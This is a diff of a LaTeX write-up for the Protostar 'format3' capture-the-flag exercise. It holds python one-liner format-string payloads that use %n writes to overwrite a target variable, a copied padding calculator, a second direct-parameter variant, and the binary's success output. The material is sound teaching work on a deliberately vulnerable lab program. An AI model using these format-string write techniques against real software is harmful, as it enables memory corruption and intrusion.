@@ -34,31 +34,60 @@ target is 0000004c :(
 \end{lstlisting}
 
 Now that we can see there is some modifications to the target variable, we want
-to write a specific value of $0x01025544$ using this pointer. This a 4byte value
+to write a specific value of \lstinline|0x01025544| using this pointer. This a 4byte value
 to be written. We can conclude that we have to write this value to 4 memory
-location from $0x080496f4$ to \lstinline|0x080496f7|.
+location from \lstinline|0x080496f4| to \lstinline|0x080496f7|.
 
 Searching online, we can see that it is possible to modify the values of multiple
 memory location using the following line of code.
 
 \begin{lstlisting}[language=bash]
 python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08' + '%x.'*11 + '%n%n%n%n'" | ./format3
-target is 58585858 :(
+>>>target is 58585858 :(
 \end{lstlisting}
 
 Now that we are able to confirm that we can modify the target variable, we will
 try to inject the values that we want to write to these memory location. We
 structure the attack such that it is based on groups of [Value, Address]. We
 repeat this structure for the 4 bytes that we want to write, to inject the value
-we use "\%u" as a mechanism to obtain the needed value and "\%n" to inject the value
+we use \lstinline|%u| as a mechanism to obtain the needed value and \lstinline|%n| to inject the value
 into the memory location. We refer to the short python calculate in this website,
-https://xavibel.com/2020/11/22/protostar-format-strings-level-3/ to obtain the
-offset needed. Computing the values, we are able to create our format attack string.
+url: \url{https://xavibel.com/2020/11/22/protostar-format-strings-level-3/} to obtain the
+offset needed. The following python code is as taken from the website.
+
+\begin{lstlisting}[language=python]
+def calculate(to_write, written):
+  to_write += 0x100
+  written %= 0x100
+  padding = (to_write - written) % 0x100
+  if padding < 10:
+      padding += 0x100
+  return padding
+\end{lstlisting}
+
+Computing the values, we are able to create our format attack string.
 
 \begin{lstlisting}[language=bash]
 python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%220u%n%17u%n%173u%n%255u%n'" | ./format3
-0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14...
-you have modified the target :)
+>>>0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14...
+>>>you have modified the target :)
+\end{lstlisting}
+
+Having a successful exploit, we want to find out if it is possible to work through
+another way. We take a look at this format of a string specification first.
+\lstinline|%60u%4\$08n|. Let us break down the meaning of this format.
+The first \lstinline|%60u| specifies 60 characters. The \lstinline|4\$| specifies
+the 4th position of the \lstinline|%x| that we have been manipulating. This time
+however, we use \lstinline|08n| to specify the 8 hexa value that we are modifying.
+Following that logic, we will create our attack string such that we do not use an
+external script. We line the attack string with the addresses we want to modify first,
+this will form a total of 16 bytes. We compute the remainder of offset that we
+need to amend in the \lstinline|%u%n| combination.
+
+\begin{lstlisting}[language=bash]
+python -c "print '\xf4\x96\x04\x08' + '\xf5\x96\x04\x08' + '\xf6\x96\x04\x08' + '\xf7\x96\x04\x08' + '%52u%12\$08n' + '%17u%13\$08n' + '%173u%14\$08n'" | ./format3
+>>>0       3221222880...3086843892...
+>>>you have modified the target :)
 \end{lstlisting}
 
 \subsection*{Source code}
